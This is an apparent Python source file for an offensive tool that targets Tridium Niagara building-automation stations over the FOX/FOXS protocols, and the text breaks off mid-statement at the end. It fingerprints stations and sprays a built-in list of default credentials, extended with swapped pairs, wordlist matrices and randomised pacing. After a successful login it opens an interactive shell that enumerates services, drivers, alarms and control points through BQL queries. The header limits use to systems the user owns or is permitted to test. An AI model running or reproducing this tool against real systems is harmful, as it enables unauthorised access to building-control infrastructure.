#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Niagara FOX Foothold Helper (AX 3.x friendly)
# ----------------------------------------------------------------------
# For systems you OWN or have EXPLICIT permission to test.
# Changes in this build:
# - Delimiter-aware receive + longer timeouts (fewer silent replies)
# - nav/read/bql fallbacks (try alternate topics + BQL when needed)
# - Visible "(empty reply)" markers for clarity
# - Shell: debug on/off, set wait <ms>, info macro
# - Default-cred spray tries (user,pass) and (pass,user) and can do full matrix
# - NEW: Verbose login/spray with reason codes (ok/rejected/digest/timeout/err)
# - Env toggles: FOX_SPRAY_VERBOSE, FOX_LOGIN_DEBUG, FOX_SPRAY_MIN/MAX_DELAY,
#                FOX_FULL_MATRIX, FOX_SPRAY_TLS_FIRST
# - NEW: FOX_THINK (global pacing), FOX_EXTRA_CREDS (inline user:pass pairs)
# ----------------------------------------------------------------------

import os, re, ssl, sys, json, time, random, socket, itertools
from typing import Any, Dict, List, Optional, Tuple
from colorama import init as colorama_init, Fore as F, Style as S

# --- init + style ---
colorama_init()
B, N = S.BRIGHT, S.RESET_ALL

# --- verbosity & tuning via env ---
LOGIN_DEBUG   = os.environ.get("FOX_LOGIN_DEBUG",   "0") == "1"   # print auth replies
SPRAY_VERBOSE = os.environ.get("FOX_SPRAY_VERBOSE", "0") == "1"   # print each attempt
SPRAY_MIN_DELAY = float(os.environ.get("FOX_SPRAY_MIN_DELAY", "0.20"))
SPRAY_MAX_DELAY = float(os.environ.get("FOX_SPRAY_MAX_DELAY", "0.45"))

# NEW: unified pacing knob (shell can still 'set wait <ms>')
DEFAULT_THINK = float(os.environ.get("FOX_THINK", "0.05"))

# --- defaults ---
DEFAULT_CREDS: List[Tuple[str, str]] = [
    # your originals
    ("admin", "admin"),
    ("admin", "FacilityExpl0rer"),
    ("admin", "password"),
    ("admin", "Password1"),
    ("admin", "1234"),
    ("tridium", "tridium"),
    ("user", "user"),
    ("guest", "guest"),
    ("operator", "operator"),
    # extras (common/CTF-ish)
    ("admin", "admin1"),
    ("admin", "admin123"),
    ("admin", "Admin123"),
    ("admin", "Admin"),
    ("admin", "pass"),
    ("admin", "changeme"),
    ("admin", "system"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "12345678"),
    ("admin", "1111"),
    ("root", "root"),
    ("root", "admin"),
    ("root", "toor"),
    ("niagara", "niagara"),
    ("Niagara", "Niagara"),
    ("tridium", "niagara"),
    ("niagara", "tridium"),
    ("workbench", "workbench"),
    ("station", "station"),
    ("fox", "fox"),
    ("guest", "guest123"),
    ("guest", "password"),
    ("user", "pass"),
    ("user", "password"),
    ("operator", "operator123"),
    ("supervisor", "supervisor"),
    ("maint", "maint"),
    ("maintenance", "maintenance"),
    ("engineer", "engineer"),
    ("security", "security"),
    ("power", "power"),
]

HELLO_NSE = b"fox a 1 -1 fox hello\n{\nfox.version=s:1.0\nid=i:1\n};;\n"
HELLO_MIN = b"fox a 0 -1 fox hello\n;;\n"
HELLO_NSE_NO_FINAL_NL = HELLO_NSE[:-1]
FOX_LINE = re.compile(r"^([\w\.]+)=([sioab]):(.*)$")

AUTO_STEPS: List[Tuple[str, str]] = [
    ("nav",  "station:|slot:/"),
    ("nav",  "station:|slot:/Services"),
    ("nav",  "station:|slot:/Drivers"),
    ("read", "station:|slot:/Services"),
    ("read", "station:|slot:/Drivers"),
    ("read", "station:|slot:/Services/AlarmService"),
    ("read", "station:|slot:/Config"),
    ("bql",  "select now(), app.name, app.version from baja:Station"),
    ("bql",  "select navOrd, name, type from baja:Component "
             "where parent = ord('station:|slot:/') order by name limit 200"),
    ("bql",  "select navOrd, name, type from baja:Component "
             "where parent = ord('station:|slot:/Services') order by name limit 400"),
    ("bql",  "select navOrd, name, parent.name from control:Point "
             "order by parent.name, name limit 1000"),
]

# --- utils ---
def banner():
    print(f"\n{F.MAGENTA}{B}Niagara FOX Foothold Helper{N}  {F.CYAN}(AX 3.x friendly){N}")
    print(f"{F.BLACK}{B}{'='*64}{N}\n")

def hexdump(b: bytes, w: int = 16) -> str:
    rows=[]
    for i in range(0,len(b),w):
        chunk=b[i:i+w]
        rows.append(f"{i:04x}  {' '.join(f'{c:02x}' for c in chunk):<{w*3}}  " +
                    "".join(chr(c) if 32<=c<=126 else "." for c in chunk))
    return "\n".join(rows) if rows else "(no data)"

def load_listfile(path: str) -> List[str]:
    out=[]
    with open(path,"r",encoding="utf-8",errors="ignore") as f:
        for line in f:
            s=line.strip()
            if s and not s.startswith("#"): out.append(s)
    return out

def parse_fox_block(text: str) -> Dict[str, Any]:
    parsed={}
    s=text.find("{"); e=text.find("}", s+1)
    if s==-1 or e==-1 or e<=s: return parsed
    for line in text[s+1:e].splitlines():
        line=line.strip().rstrip(";")
        if not line or "=" not in line: continue
        m=FOX_LINE.match(line)
        if not m:
            k,_,v=line.partition("="); parsed[k.strip()]=v.strip(); continue
        k,typ,v=m.groups(); v=v.strip()
        if typ=="i":
            try: parsed[k]=int(v)
            except ValueError: parsed[k]=v
        else:
            parsed[k]=v
    return parsed

def normalize_pretty(info: Dict[str, Any]) -> Dict[str, Any]:
    tz=(info.get("timeZone") or "")
    tz_short=tz.split(";",1)[0] if ";" in tz else tz
    return {
        "fox.version": info.get("fox.version"),
        "hostName": info.get("hostName"),
        "hostAddress": info.get("hostAddress"),
        "app.name": info.get("app.name"),
        "app.version": info.get("app.version"),
        "vm.name": info.get("vm.name"),
        "vm.version": info.get("vm.version"),
        "os.name": info.get("os.name"),
        "os.version": info.get("os.version"),
        "station.name": info.get("station.name"),
        "lang": info.get("lang"),
        "timeZone": tz_short,
        "hostId": info.get("hostId"),
        "vmUuid": info.get("vmUuid"),
        "brandId": info.get("brandId"),
        "id": info.get("id"),
    }

# --- networking ---
def tcp_connect(host:str, port:int, timeout:float=4.0, bind_src:Optional[Tuple[str,int]]=None)->socket.socket:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    try: s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except Exception: pass
    if bind_src: s.bind(bind_src)
    s.settimeout(timeout); s.connect((host,port)); return s

def recv_until(sock: socket.socket, expect_term: bytes=b";;\n",
               idle_gap: float=0.6, ceiling: float=10.0, max_bytes:int=1048576) -> bytes:
    """
    Read until idle or (heuristic) frame terminator seen at least once.
    AX sometimes dribbles replies; give it time.
    """
    buf=bytearray()
    t0=time.time(); last=time.time()
    sock.settimeout(idle_gap)
    term_seen=False
    while True:
        if time.time()-t0>ceiling: break
        try:
            chunk=sock.recv(8192)
            if not chunk: break
            buf += chunk
            last=time.time()
            if expect_term in buf: term_seen=True
            if len(buf)>=max_bytes: break
        except socket.timeout:
            if time.time()-last>=idle_gap and (term_seen or len(buf)>0):
                break
    return bytes(buf)

def build_fox_block(topic:str, fields:Dict[str,Any], chan:int=1, reply_to:int=-1)->bytes:
    lines=[]
    for k,v in fields.items():
        if isinstance(v, int): lines.append(f"{k}=i:{v}")
        else: lines.append(f"{k}=s:{v}")
    body="{\n" + "\n".join(lines) + "\n}"
    return (f"fox a {chan} {reply_to} {topic}\n").encode() + body.encode() + b";;\n"

def send_fox(sock:socket.socket, topic:str, fields:Dict[str,Any], think:float=DEFAULT_THINK,
             debug:bool=False)->str:
    pkt=build_fox_block(topic, fields)
    sock.sendall(pkt)
    time.sleep(think)
    data=recv_until(sock)
    if debug:
        print(f"{F.BLUE}{B}[dbg] tx topic:{topic} fields:{fields}{N}")
        print(f"{F.BLUE}{B}[dbg] rx {len(data)} bytes{N}")
        if len(data)<=4096: print(hexdump(data))
    return data.decode("latin-1","replace")

# --- session ---
class FoxSession:
    def __init__(self, host:str, port:int, user:str, pw:str, tls:bool=False, timeout:float=6.0):
        self.host, self.port, self.user, self.pw, self.tls = host, port, user, pw, tls
        self.timeout=timeout
        self.sock: Optional[socket.socket]=None
        self.debug=False
        self.think=DEFAULT_THINK

    def _connect(self)->Optional[socket.socket]:
        base=tcp_connect(self.host,self.port,timeout=self.timeout)
        try:
            if self.tls:
                ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                s=ctx.wrap_socket(base, server_hostname=self.host)
            else:
                s=base
            # hello + open + login
            s.sendall(HELLO_MIN); _=recv_until(s)
            _=send_fox(s, "fox open", {"clientName":"Workbench","app.name":"Workbench","clientInfo":"lab-shell"},
                       think=self.think, debug=self.debug)
            resp=send_fox(s,"auth login",{
                "authAgentType":"fox:FoxUsernamePasswordAuthAgent","username":self.user,"password":self.pw
            }, think=self.think, debug=self.debug)
            if "rejected" in resp.lower():
                try: s.close()
                except: pass
                return None
            return s
        except Exception:
            try: base.close()
            except: pass
            return None

    def open(self)->bool:
        self.close()
        self.sock=self._connect()
        return self.sock is not None

    def close(self)->None:
        if self.sock:
            try:
                _=send_fox(self.sock,"fox close",{},think=self.think,debug=self.debug)
            except Exception: pass
            try: self.sock.close()
            except Exception: pass
            self.sock=None

    def _ensure(self)->bool:
        if self.sock is None: return self.open()
        try:
            _=send_fox(self.sock,"baja ping",{"msg":"ok"},think=self.think,debug=self.debug)
        except NameError:
            _=send_fox(self.sock,"baja ping",{"msg":"ok"},think=self.think,debug=self.debug)  # retained typo guard
            return True
        except Exception:
            self.close(); return self.open()
        return True

    def request(self, topic:str, fields:Dict[str,Any])->str:
        if not self._ensure(): return ""
        try:
            return send_fox(self.sock, topic, fields, think=self.think, debug=self.debug)
        except (BrokenPipeError, OSError):
            if not self.open(): return ""
            try:
                return send_fox(self.sock, topic, fields, think=self.think, debug=self.debug)
            except Exception:
                return ""

    # helpers with fallbacks
    def who(self)->str:
        r=self.request("baja ping", {"msg":"hello"})
        if r.strip(): return r
        return self.bql("select now(), app.name, app.version from baja:Station")

    def nav(self, ord_str:str)->str:
        ord_str = _fix_station_prefix(ord_str)
        r=self.request("baja children", {"ord": ord_str})
        if r.strip(): return r
        r=self.request("nav children", {"ord": ord_str})
        if r.strip(): return r
        q=("select navOrd, name, type from baja:Component where parent = ord('{o}') "
           "order by name limit 400").format(o=ord_str.replace("'", "''"))
        r=self.bql(q)
        return r if r.strip() else ""

    def read(self, ord_str:str)->str:
        ord_str = _fix_station_prefix(ord_str)
        r=self.request("baja ord read", {"ord": ord_str})
        if r.strip(): return r
        r=self.request("baja resolve", {"ord": ord_str})
        if r.strip(): return r
        q=("select * from baja:Component where navOrd = ord('{o}') limit 1").format(
            o=ord_str.replace("'", "''"))
        r=self.bql(q)
        return r if r.strip() else ""

    def bql(self, query:str)->str:
        r=self.request("baja bql", {"query": query})
        if r.strip(): return r
        r=self.request("bql query", {"query": query})
        return r

# --- auth / spray helpers ---
def _build_cred_candidates(defaults:List[Tuple[str,str]], extras:Optional[List[Tuple[str,str]]]=None,
                           try_swapped:bool=True, full_matrix:bool=False)->List[Tuple[str,str]]:
    pairs=set(defaults)
    if extras: pairs |= set(extras)
    if try_swapped:
        pairs |= set((p,u) for (u,p) in list(pairs) if u!=p)
    if full_matrix:
        users={u for (u,_) in pairs}; pwds={p for (_,p) in pairs}
        for u in users:
            for p in pwds:
                pairs.add((u,p))
                if try_swapped and u!=p: pairs.add((p,u))
    ordered=[]; seen=set()
    for u,p in list(pairs):
        if (u,p) not in seen:
            seen.add((u,p)); ordered.append((u,p))
    return ordered

def _status_from_auth_reply(text: str) -> str:
    """
    Heuristic parse of 'auth login' reply so we can print WHY a try failed.
    Returns one of: 'ok', 'rejected', 'digest', 'unknown'
    """
    t = (text or "").lower()
    if "rejected" in t: return "rejected"
    if "digest" in t or "challenge" in t or "authagent" in t: return "digest"
    if "ok" in t or "success" in t or "logged" in t: return "ok"
    return "unknown"

def try_one_strategy(host:str, port:int, payload:bytes, cuts:List[int], tls_first:bool,
                     bind_src:Optional[Tuple[str,int]], think:float)->Tuple[bytes,str]:
    def _send_with(sock:socket.socket)->bytes:
        time.sleep(0.10)
        start=0
        for cut in cuts:
            sock.sendall(payload[start:cut]); time.sleep(think); start=cut
        sock.sendall(payload[start:])
        return recv_until(sock)
    if tls_first:
        try:
            ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            with tcp_connect(host,port,timeout=4.0,bind_src=bind_src) as base:
                with ctx.wrap_socket(base,server_hostname=host) as ssock:
                    ssock.settimeout(3.0); data=_send_with(ssock)
                    if data: return data,"ssl"
        except Exception: pass
    try:
        with tcp_connect(host,port,timeout=4.0,bind_src=bind_src) as sock:
            sock.settimeout(3.0); data=_send_with(sock); return data,"plain"
    except Exception:
        return b"","plain"

def try_login2(host: str, port: int, user: str, pw: str, tls: bool,
               verbose: bool = False) -> Tuple[bool, str]:
    """
    Attempt a username/password login and return (ok, reason).
    reason ∈ {'ok','rejected','digest','timeout','error','unknown'}
    """
    try:
        _data, _proto = try_one_strategy(host, port, HELLO_MIN, [], tls, None, think=DEFAULT_THINK)
    except Exception:
        pass

    base=None
    try:
        base = tcp_connect(host, port, timeout=4.0)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(base, server_hostname=host)
        else:
            sock = base

        sock.sendall(HELLO_MIN); _ = recv_until(sock)
        _ = send_fox(sock, "fox open", {
            "clientName": "Workbench",
            "app.name": "Workbench",
            "clientInfo": "login-probe",
        }, think=DEFAULT_THINK)

        resp = send_fox(sock, "auth login", {
            "authAgentType": "fox:FoxUsernamePasswordAuthAgent",
            "username": user,
            "password": pw
        }, think=DEFAULT_THINK)

        status = _status_from_auth_reply(resp)
        ping = send_fox(sock, "baja ping", {"msg": "hi"}, think=DEFAULT_THINK)
        if "rejected" in (ping or "").lower():
            status = "rejected"

        if LOGIN_DEBUG or verbose:
            snippet = (resp[:160].replace("\n", "\\n") if resp else "")
            print(f"    [auth] {('FOXS' if tls else 'FOX')}:{port} {user}:{pw} -> {status}  {F.BLUE}{snippet}{N}")

        try: sock.close()
        except Exception: pass

        return (status == "ok" or status == "unknown") and ("rejected" not in (ping or "").lower()), status

    except socket.timeout:
        if verbose:
            print(f"    [auth] {('FOXS' if tls else 'FOX')}:{port} {user}:{pw} -> timeout")
        return False, "timeout"
    except Exception as e:
        if verbose:
            print(f"    [auth] {('FOXS' if tls else 'FOX')}:{port} {user}:{pw} -> error: {e}")
        try:
            if base: base.close()
        except Exception: pass
        return False, "error"

def _parse_env_extra_pairs() -> List[Tuple[str,str]]:
    """
    FOX_EXTRA_CREDS="user1:pass1,user2:pass2"
    """
    raw = os.environ.get("FOX_EXTRA_CREDS","").strip()
    if not raw:
        return []
    pairs=[]
    for item in raw.split(","):
        item=item.strip()
        if not item or ":" not in item: continue
        u,p = item.split(":",1)
        u=u.strip(); p=p.strip()
        if u and p: pairs.append((u,p))
    return pairs

def spray_default_creds(host:str, prefer_tls:bool=True, extra_creds:Optional[List[Tuple[str,str]]]=None,
                        delay_range:Tuple[float,float]=(SPRAY_MIN_DELAY,SPRAY_MAX_DELAY), retries:int=0,
                        try_swapped:bool=True, full_matrix:bool=False)->Optional[Tuple[str,int,str,str]]:
    # merge file-provided extras with env-provided pairs
    env_pairs = _parse_env_extra_pairs()
    merged_extras = (extra_creds or []) + env_pairs

    candidates=_build_cred_candidates(DEFAULT_CREDS, extras=merged_extras,
                                      try_swapped=try_swapped, full_matrix=full_matrix)
    order=[(True,4911),(False,1911)]
    if not prefer_tls: order.reverse()

    print(f"{F.YELLOW}{B}[-]{N} Spraying {len(candidates)} pairs "
          f"({'FOXS→FOX' if prefer_tls else 'FOX→FOXS'}) …")
    if SPRAY_VERBOSE:
        print(f"{F.BLUE}[i]{N} Verbose spray enabled.")

    for (tls,port) in order:
        mode="FOXS" if tls else "FOX"
        for (u,p) in candidates:
            time.sleep(random.uniform(*delay_range))
            ok, why = try_login2(host,port,u,p,tls=tls, verbose=SPRAY_VERBOSE)
            if not ok and retries>0:
                for _ in range(retries):
                    time.sleep(random.uniform(*delay_range))
                    ok, why = try_login2(host,port,u,p,tls=tls, verbose=SPRAY_VERBOSE)
                    if ok: break
            if SPRAY_VERBOSE and not ok:
                print(f"    [{mode}:{port}] {u}:{p} -> {F.RED}{why}{N}")
            if ok:
                if SPRAY_VERBOSE:
                    print(f"    [{mode}:{port}] {u}:{p} -> {F.GREEN}OK{N}")
                return (mode, port, u, p)
    return None

# --- enumerate ---
def enumerate_fox(host:str, port:int, try_tls_first:bool=True,
                  bind_source_port:Optional[int]=None, show_hex:bool=False)->Optional[Dict[str,Any]]:
    bind_src=("",bind_source_port) if bind_source_port else None
    strategies=[
        ("NSE exact (one shot)", HELLO_NSE, []),
        ("NSE segmented 2-part", HELLO_NSE, [HELLO_NSE.find(b"{\n")+2]),
        ("NSE segmented 3-part", HELLO_NSE, [HELLO_NSE.find(b"\n{\n")+1, HELLO_NSE.rfind(b"\n")]),
        ("Minimal hello", HELLO_MIN, []),
        ("NSE no-final-newline", HELLO_NSE_NO_FINAL_NL, []),
    ]
    print(f"{F.GREEN}{B}[*]{N} Scanning {host}:{port} with {len(strategies)} strategies "
          f"(TLS-first={try_tls_first}, src_port={'auto' if not bind_source_port else bind_source_port})")
    for name,payload,cuts in strategies:
        print(f"  • {F.CYAN}{name}{N} … ", end="", flush=True)
        data,proto=try_one_strategy(host,port,payload,cuts,try_tls_first,bind_src,think=DEFAULT_THINK)
        if not data: print(f"{F.YELLOW}no data{N}"); continue
        print(f"{F.GREEN}got {len(data)} bytes via {proto}{N}")
        text=data.decode("latin-1","replace")
        info=parse_fox_block(text)
        if show_hex: print(f"\n{F.BLUE}{B}Raw hexdump{N}\n{hexdump(data)}\n")
        if info:
            print(f"{F.GREEN}{B}[+]{N} Parsed FOX HELLO block")
            pretty=normalize_pretty(info)
            for k,v in pretty.items():
                if v is not None:
                    print(f"    {F.CYAN}{k:14}{N}: {v}")
            return {"strategy":name,"proto":proto,"bytes":len(data),"raw":text,"parsed":info,"pretty":pretty}
        else:
            if "fox a 0" in text or "{\n" in text:
                print(f"{F.YELLOW}[!]{N} Data received but couldn’t parse k/v block — check raw:")
                print(text[:2000])
    print(f"{F.RED}{B}[!]{N} No parseable reply from any strategy.")
    return None

# --- shell helpers ---
def _fix_station_prefix(s:str)->str:
    return "station:|slot:/"+s[len("station:/"):] if s.startswith("station:/") else s

def _path_to_station_slot(path:str)->str:
    p=path if path.startswith("/") else f"/{path}"
    return "station:|slot:"+p

def _extract_slot_path(ord_str:str)->str:
    s=_fix_station_prefix(ord_str)
    if s.startswith("station:|slot:"): return s[len("station:|slot:"):]
    if s.startswith("slot:"): return s[len("slot:"):]
    return "/"

def _join_rel(base_ord:str, rel:str)->str:
    base=_extract_slot_path(base_ord)
    if not base.startswith("/"): base="/"+base
    if rel.startswith("/"): return _path_to_station_slot(rel)
    parts=[p for p in base.split("/") if p]
    for seg in rel.split("/"):
        if seg in ("","."): continue
        if seg=="..":
            if parts: parts.pop()
        else: parts.append(seg)
    return _path_to_station_slot("/" + "/".join(parts))

MACROS={"root":"station:|slot:/","/":"station:|slot:/","services":"station:|slot:/Services",
        "drivers":"station:|slot:/Drivers","config":"station:|slot:/Config","alarms":"station:|slot:/Services/AlarmService"}

def coerce_ord(arg:str, current_ord:str)->str:
    if not arg: return current_ord
    a=arg.strip(); low=a.lower()
    if low in MACROS: return MACROS[low]
    if a.startswith(("slot:","station:")): return _fix_station_prefix(a)
    if a.startswith("/"): return _path_to_station_slot(a)
    return _join_rel(current_ord, a)

def run_steps(sess:"FoxSession", steps:List[Tuple[str,str]])->Dict[str,str]:
    out={}
    for verb,arg in steps:
        key=f"{verb} {arg}".strip()
        try:
            if verb=="who": v=sess.who()
            elif verb=="nav": v=sess.nav(coerce_ord(arg,"station:|slot:/"))
            elif verb=="read": v=sess.read(coerce_ord(arg,"station:|slot:/"))
            elif verb=="bql": v=sess.bql(arg)
            else: v=f"(unknown verb: {verb})"
        except Exception as e:
            v=f"(error: {e})"
        out[key]=v if v.strip() else "(empty reply)"
    return out

def parse_script_lines(path:str)->List[Tuple[str,str]]:
    steps=[]
    with open(path,"r",encoding="utf-8",errors="ignore") as f:
        for line in f:
            s=line.strip()
            if not s or s.startswith("#"): continue
            if s.lower()=="who": steps.append(("who",""))
            elif s.lower().startswith("nav "): steps.append(("nav",s[4:].strip()))
            elif s.lower().startswith("read "): steps.append(("read",s[5:].strip()))
            elif s.lower().startswith("bql "): steps.append(("bql",s[4:].strip()))
            else:
                if ":" in s or s.startswith("/"): steps.append(("read", s))
    return steps

def fox_shell(session:"FoxSession"):
    current_ord="station:|slot:/"
    def show_help():
        print("Commands:")
        print("  who, whoami | info")
        print("  ls [path]              -> nav children (defaults to cwd)")
        print("  cd <path>              -> change cwd (supports /, .., macros)")
        print("  pwd                    -> print cwd")
        print("  cat <path>             -> read")
        print("  nav <ord|path>         -> raw nav (scheme inferred)")
        print("  read <ord|path>        -> raw read (scheme inferred)")
        print("  bql <query>")
        print("  points                 -> BQL listing of control:Point (1000 rows)")
        print("  comps [services|root]  -> component listing via BQL")
        print("  root|services|drivers|config|alarms  -> cd to macro")
        print("  auto [save file.json]  -> run playbook")
        print("  script <path> [save file.json]")
        print("  debug on|off           -> toggle hex + byte counts")
        print("  set wait <ms>          -> adjust send think-time")
        print("  creds, help, exit")

    print(f"{F.CYAN}{B}[*]{N} Entering FOX shell. Type 'help' for shortcuts.")
    while True:
        try:
            prompt=_extract_slot_path(current_ord) or "/"
            cmd=input(f"{F.GREEN}fox:{prompt}>{N} ").strip()
        except EOFError:
            break
        if not cmd: continue
        low=cmd.lower()

        if low in ("exit","quit","q"): break
        if low in ("help","?"): show_help(); continue
        if low=="creds":
            print(f"user={session.user} pass={session.pw} on {'FOXS' if session.tls else 'FOX'}:{session.port}")
            continue
        if low in ("who","whoami"):
            r=session.who(); print(r if r.strip() else "(empty reply)"); continue
        if low=="info":
            q="select now(), app.name, app.version, station.name from baja:Station"
            r=session.bql(q); print(r if r.strip() else "(empty reply)"); continue

        if low in MACROS and " " not in low:
            current_ord=MACROS[low]; print(f"{F.CYAN}cwd -> {current_ord}{N}"); continue

        if low.startswith("cd "):
            arg=cmd[3:].strip()
            try:
                new_ord=coerce_ord(arg,current_ord)
                _=session.nav(new_ord)  # validate
                current_ord=new_ord; print(f"{F.CYAN}cwd -> {current_ord}{N}")
            except Exception as e:
                print(f"{F.RED}cd failed: {e}{N}")
            continue

        if low=="pwd": print(current_ord); continue

        if low.startswith("ls"):
            arg=cmd[2:].strip()
            target=coerce_ord(arg,current_ord) if arg else current_ord
            r=session.nav(target); print(r if r.strip() else "(empty reply)"); continue

        if low.startswith("cat "):
            arg=cmd[4:].strip()
            target=coerce_ord(arg,current_ord)
            r=session.read(target); print(r if r.strip() else "(empty reply)"); continue

        if low.startswith("nav "):
            arg=cmd[4:].strip()
            target=coerce_ord(arg,current_ord)
            r=session.nav(target); print(r if r.strip() else "(empty reply)"); continue

        if low.startswith("read "):
            arg=cmd[5:].strip()
            target=coerce_ord(arg,current_ord)
            r=session.read(target); print(r if r.strip() else "(empty reply)"); continue

        if low.startswith("bql "):
            q=cmd[4:].strip()
            if not q: print(f"{F.YELLOW}Provide a query after 'bql'.{N}"); continue
            r=session.bql(q); print(r if r.strip() else "(empty reply)"); continue

        if low=="points":
            q=("select navOrd, name, parent.name from control:Point "
               "order by parent.name, name limit 1000")
            r=session.bql(q); print(r if r.strip() else "(empty reply)"); continue

        if low.startswith("comps"):
            parts=cmd.split()
            if len(parts)>=2 and parts[1].lower().startswith("serv"):
                q=("select navOrd, name, type from baja:Component "
                   "where parent = ord('station:|slot:/Services') order by name limit 400")
            else:
                q=("select navOrd, name, type from baja:Component "
                   "where parent = ord('station:|slot:/') order by name limit 200")
            r=session.bql(q); print(r if r.strip() else "(empty reply)"); continue

        if low.startswith("auto"):
            parts=cmd.split()
            results=run_steps(session, AUTO_STEPS)
            if len(parts)>=3 and parts[1].lower()=="save":
                fn=parts[2]
                try:
                    with open(fn,"w",encoding="utf-8") as f: json.dump(results,f,indent=2)
                    print(f"{F.GREEN}Saved playbook output → {fn}{N}")
                except Exception as e:
                    print(f"{F.RED}Save failed: {e}{N}")
            else:
                for k,v in results.items():
                    print(f"{F.CYAN}{k}{N}\n{v}\n")
            continue

        if low.startswith("script "):
            parts=cmd.split(maxsplit=3)
            path=parts[1] if len(parts)>=2 else ""
            if not path or not os.path.exists(path):
                print(f"{F.RED}script file missing/not found.{N}"); continue
            steps=parse_script_lines(path)
            results=run_steps(session, steps)
            if len(parts)>=4 and parts[2].lower()=="save":
                fn=parts[3]
                try:
                    with open(fn,"w",encoding="utf-8") as f: json.dump(results,f,indent=2)
                    print(f"{F.GREEN}Saved script output → {fn}{N}")
                except Exception as e:
                    print(f"{F.RED}Save failed: {e}{N}")
            else:
                for k,v in results.items():
                    print(f"{F.CYAN}{k}{N}\n{v}\n")
            continue

        if low.startswith("debug "):
            val=low.split(None,1)[1].strip()
            if val in ("on","1","true","yes"): session.debug=True; print("[dbg] on")
            else: session.debug=False; print("[dbg] off")
            continue

        if low.startswith("set "):
            parts=low.split()
            if len(parts)>=3 and parts[1]=="wait":
                try:
                    ms=int(parts[2]); session.think=max(0.0, ms/1000.0); print(f"[think]={session.think:.2f}s")
                except ValueError:
                    print("set wait <ms>")
            else:
                print("set wait <ms>")
            continue

        print(f"{F.YELLOW}Unknown command. Type 'help'.{N}")

# --- interactive main ---
def main():
    banner()
    while True:
        host=input(f"{B}{F.WHITE}? Target IP/host:{N} ").strip()
        if not host:
            print(f"{F.RED}  need a host{N}"); continue
        p=input(f"{B}? Port [{F.CYAN}1911{N}{B}]: {N}").strip()
        port=int(p) if p else 1911
        tls_first=input(f"{B}? Try TLS first (y/N): {N}").strip().lower()=="y"
        srcp=input(f"{B}? Bind source TCP port (blank=auto): {N}").strip()
        bindp=int(srcp) if srcp else None
        show_hex=input(f"{B}? Show hexdump during enumerate (y/N): {N}").strip().lower()=="y"
        retries_s=input(f"{B}? Retries per cred [{F.CYAN}0{N}{B}]: {N}").strip()
        retries=int(retries_s) if retries_s.isdigit() else 0

        result=enumerate_fox(host,port,try_tls_first=tls_first,bind_source_port=bindp,show_hex=show_hex)
        if not result:
            print(f"{F.RED}{B}[-]{N} Enumeration failed. Try a different port or enable TLS-first.")
            again=input(f"\n{B}Try another? (y/N): {N}").strip().lower()
            if again!="y": break
            else: continue

        env_u=os.environ.get("FOX_USER","")
        env_p=os.environ.get("FOX_PASS","")
        user=env_u or (input(f"{B}User [{F.CYAN}admin{N}{B}]: {N}").strip() or "admin")
        pw  =env_p or (input(f"{B}Pass [{F.CYAN}admin{N}{B}]: {N}").strip() or "admin")

        print(f"\n{F.YELLOW}{B}[-]{N} Trying single credential {F.MAGENTA}FOXS/4911{N} → "
              f"{('FOXS' if (tls_first or port==4911) else 'FOX')}/{port} → {F.BLUE}FOX/1911{N} …")

        found: Optional[Tuple[bool,int,str,str]] = None
        for (tls,ppt) in [(True,4911),(tls_first or (port==4911),port),(False,1911)]:
            mode="FOXS" if tls else "FOX"
            ok, why = try_login2(host,ppt,user,pw,tls=tls, verbose=True)
            if ok:
                print(f"{F.GREEN}{B}[+]{N} Logged in over {mode} ({ppt}) with {F.CYAN}{user}:{pw}{N}")
                sess=FoxSession(host,ppt,user,pw,tls=tls)
                if sess.open():
                    found=(tls,ppt,user,pw); print(f"{F.GREEN}{B}[+]{N} Live session opened on {mode} {ppt}.")
                else:
                    print(f"{F.YELLOW}{B}[!]{N} Login accepted but live session open failed on {mode} {ppt}.")
                break
            else:
                print(f"  {F.YELLOW}[-]{N} {mode}({ppt}) {user}:{pw} -> {why}")
                if why == "digest":
                    print(f"    {F.BLUE}[i]{N} Target likely requires AX-digest (not implemented).")

        if not found:
            want_full_matrix=os.environ.get("FOX_FULL_MATRIX","0")=="1"
            prefer_tls=os.environ.get("FOX_SPRAY_TLS_FIRST","1")!="0"
            extras=None
            if input(f"{B}? Use external user/pass lists? (y/N): {N}").strip().lower()=="y":
                up=input(f"{B}  - path to usernames file: {N}").strip()
                pp=input(f"{B}  - path to passwords file: {N}").strip()
                if up and pp:
                    try:
                        users=load_listfile(up); pwds=load_listfile(pp)
                        extras=list(itertools.product(users,pwds))
                        print(f"{F.YELLOW}{B}[!]{N} Loaded extras: {len(users)} users × {len(pwds)} passwords")
                    except Exception as e:
                        print(f"{F.RED}[!] Failed loading lists: {e}{N}")
            # FOX_EXTRA_CREDS env is auto-consumed inside spray_default_creds()
            print(f"{F.YELLOW}{B}[-]{N} Spraying defaults (incl. swapped){' + full matrix' if want_full_matrix else ''} …")
            hit=spray_default_creds(host,prefer_tls=prefer_tls,extra_creds=extras,
                                    delay_range=(SPRAY_MIN_DELAY,SPRAY_MAX_DELAY),
                                    retries=retries, try_swapped=True, full_matrix=want_full_matrix)
            if hit:
                proto,hp,hu,hpw=hit
                print(f"{F.GREEN}{B}[+]{N} {proto} ({hp})  {F.CYAN}{hu}:{hpw}{N}")
                found=((proto=="FOXS"),hp,hu,hpw)
            else:
                print(f"{F.RED}{B}[-]{N} No default credentials worked.")
                again=input(f"\n{B}Try another target? (y/N): {N}").strip().lower()
                if again!="y": break
                else: continue

        if found:
            tls,live_port,lu,lp=found
            sess=FoxSession(host,live_port,lu,lp,tls=tls)
            if not sess.open():
                print(f"{F.RED}{B}[-]{N} Could not open a live session with discovered creds.")
            else:
                mode="FOXS" if tls else "FOX"
                print(f"{F.GREEN}{B}[+]{N} Session open on {mode} {live_port} as {F.CYAN}{lu}{N}. Type 'help' for commands.")
                try:
                    fox_shell(sess)
                finally:
                    sess.close()

        if input(f"\n{B}Save JSON banner? (y/N): {N}").strip().lower()=="y" and result:
